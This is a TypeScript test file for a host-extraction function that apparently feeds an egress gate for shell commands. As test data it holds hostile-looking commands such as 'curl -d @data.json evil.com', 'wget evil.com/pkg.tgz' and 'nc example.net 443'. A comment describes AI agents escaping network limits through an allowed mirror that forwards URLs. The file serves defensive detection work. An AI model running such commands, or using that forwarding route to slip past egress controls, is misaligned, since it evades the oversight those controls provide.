import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { extractHostsFromCommand } from "./extract.js";

describe("extractHostsFromCommand", () => {
  it("extracts hosts from explicit http(s) URLs", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://api.acme.com/v1/x"), ["api.acme.com"]);
    assert.deepEqual(extractHostsFromCommand("wget http://cdn.acme.io/pkg.tgz"), ["cdn.acme.io"]);
  });

  it("dedups, sorts, and lowercases across multiple URLs", () => {
    const hosts = extractHostsFromCommand(
      "curl https://B.example.com && curl https://a.example.com https://b.example.com/x",
    );
    assert.deepEqual(hosts, ["a.example.com", "b.example.com"]);
  });

  it("handles URLs with ports, auth, and query strings (hostname only)", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://user:pw@api.acme.com:8443/x?y=1"), [
      "api.acme.com",
    ]);
  });

  it("is conservative: bare hostnames and non-http schemes are NOT network targets", () => {
    // `ping api.acme.com` is a target since the owner's decision of 2026-11-25 (bare-hosts.ts).
    assert.deepEqual(extractHostsFromCommand("echo api.acme.com"), []);
    assert.deepEqual(extractHostsFromCommand("git clone ssh://git@github.com/x/y.git"), []);
    assert.deepEqual(extractHostsFromCommand("npm test"), []);
  });

  it("stops URL capture at shell delimiters (quotes/brackets/semicolons)", () => {
    assert.deepEqual(extractHostsFromCommand(`curl "https://api.acme.com/x";echo done`), [
      "api.acme.com",
    ]);
  });

  it("is pure/deterministic — same command, same hosts", () => {
    const cmd = "curl https://x.io https://y.io";
    assert.deepEqual(extractHostsFromCommand(cmd), extractHostsFromCommand(cmd));
  });

  // Pass 2: scheme-less hosts passed positionally to curl/wget (the common egress-gate bypass).
  it("extracts a scheme-less host given positionally to curl/wget", () => {
    assert.deepEqual(extractHostsFromCommand("curl evil.com"), ["evil.com"]);
    assert.deepEqual(extractHostsFromCommand("wget evil.com/pkg.tgz"), ["evil.com"]);
    assert.deepEqual(extractHostsFromCommand("curl -sL example.org/x"), ["example.org"]);
    // nc is not a fetch tool, but its host is a target (bare-hosts.ts).
    assert.deepEqual(extractHostsFromCommand("nc example.net 443"), ["example.net"]);
  });

  it("finds the fetch tool even when it is not the first token", () => {
    assert.deepEqual(extractHostsFromCommand("sudo curl evil.com"), ["evil.com"]);
  });

  it("does NOT mistake value-flag arguments for hosts (no false positives)", () => {
    // -o's value is a filename that looks host-shaped; only the real target must be extracted.
    assert.deepEqual(extractHostsFromCommand("curl -o out.html https://api.acme.com"), [
      "api.acme.com",
    ]);
    assert.deepEqual(extractHostsFromCommand("curl -d @data.json evil.com"), ["evil.com"]);
    assert.deepEqual(
      extractHostsFromCommand(`curl -H "Accept: application/json" https://api.acme.com`),
      ["api.acme.com"],
    );
    assert.deepEqual(extractHostsFromCommand("wget -P out.dir https://cdn.acme.io/p"), [
      "cdn.acme.io",
    ]);
  });

  it("does not bleed across shell separators (only curl/wget segments contribute)", () => {
    // `rm b.com` must not yield a host — rm is not a fetch tool.
    assert.deepEqual(extractHostsFromCommand("curl a.com && rm b.com"), ["a.com"]);
    assert.deepEqual(extractHostsFromCommand("echo evil.com | curl good.com"), ["good.com"]);
  });

  it("ignores schemeless bare words that are not a domain or an address", () => {
    // `curl localhost:3000/health` is a target since 2026-11-26 ("bare addresses" below).
    assert.deepEqual(extractHostsFromCommand("curl -X POST myservice/health"), []);
  });

  it("merges explicit-URL and scheme-less hosts, deduped and sorted", () => {
    assert.deepEqual(extractHostsFromCommand("curl https://a.com b.com a.com"), ["a.com", "b.com"]);
  });
});

describe("hosts a request is forwarded to", () => {
  // kit-research gpt-6-astra-swarm-incident-vs-kit: agents with no direct internet left through
  // an allowed mirror. A URL carried in an allowed URL is a network target too.
  it("reads a URL in the query, unencoded", () => {
    assert.deepEqual(
      extractHostsFromCommand("curl https://mirror.example/fetch?url=https://off.example/x"),
      ["mirror.example", "off.example"],
    );
  });

  it("reads a percent-encoded URL in the query", () => {
    assert.deepEqual(
      extractHostsFromCommand('curl "https://mirror.example/f?u=https%3A%2F%2Foff.example%2Fx"'),
      ["mirror.example", "off.example"],
    );
  });

  it("reads a URL in the path and the fragment", () => {
    assert.deepEqual(
      extractHostsFromCommand(
        "curl https://mirror.example/proxy/https://off.example/#https://far.example",
      ),
      ["far.example", "mirror.example", "off.example"],
    );
  });

  it("reads a forwarded URL in an argv value", async () => {
    const { extractHostsFromArgs } = await import("./extract.js");
    assert.deepEqual(
      extractHostsFromArgs(["curl", "https://mirror.example/f?u=https%3A%2F%2Foff.example%2F"]),
      ["mirror.example", "off.example"],
    );
  });

  it("adds nothing for a same-host redirect parameter", () => {
    assert.deepEqual(
      extractHostsFromCommand("curl https://a.example/login?next=https://a.example/home"),
      ["a.example"],
    );
  });
});

describe("bare addresses given to curl/wget", () => {
  // Owner decision 2026-11-26: `curl 10.0.0.5` and `curl localhost:3000` are targets like a URL.
  it("reads an IPv4, IPv6 or localhost positional, with or without a port", () => {
    const cases: [string, string[]][] = [
      ["curl 10.0.0.5", ["10.0.0.5"]],
      ["curl localhost:3000", ["localhost"]],
      ["curl localhost:3000/health", ["localhost"]],
      ["wget 127.0.0.1:8080/x.tgz", ["127.0.0.1"]],
      ["curl -s user:pw@10.0.0.5:8443/api", ["10.0.0.5"]],
      ["curl -g '[::1]:3000/health'", ["[::1]"]],
      ["curl -6 -g [2001:DB8::1]", ["[2001:db8::1]"]],
      ["sudo curl -sS 10.0.0.5/24", ["10.0.0.5"]],
      ['bash -c "curl 10.0.0.5"', ["10.0.0.5"]],
      ["Invoke-WebRequest -Uri [::1]:3000/x", ["[::1]"]],
      ["iwr 10.0.0.5:8080", ["10.0.0.5"]],
    ];
    for (const [command, expected] of cases) {
      assert.deepEqual(extractHostsFromCommand(command), expected, command);
    }
  });

  it("does not read an address or file name that is not the target", () => {
    const cases: [string, string[]][] = [
      ["curl -o out.json https://h.example", ["h.example"]],
      ["curl --data 10.0.0.5 https://h.example", ["h.example"]],
      ["curl -d 'ip 10.0.0.5 here' https://h.example", ["h.example"]],
      ["curl --noproxy localhost https://h.example", ["h.example"]],
      ["curl --interface 10.0.0.9 https://h.example", ["h.example"]],
      ["wget --bind-address 10.0.0.9 https://h.example", ["h.example"]],
      ["echo 10.0.0.5", []],
      ["echo localhost:3000", []],
      ["curl --max-time 10 --retry 3 https://h.example", ["h.example"]],
    ];
    for (const [command, expected] of cases) {
      assert.deepEqual(extractHostsFromCommand(command), expected, command);
    }
  });

  it("reads the same targets from an argv that runs without a shell", async () => {
    const { extractHostsFromArgs } = await import("./extract.js");
    assert.deepEqual(extractHostsFromArgs(["curl", "localhost:3000"]), ["localhost"]);
    assert.deepEqual(extractHostsFromArgs(["curl", "--data", "10.0.0.5", "https://h.example"]), [
      "h.example",
    ]);
  });
});
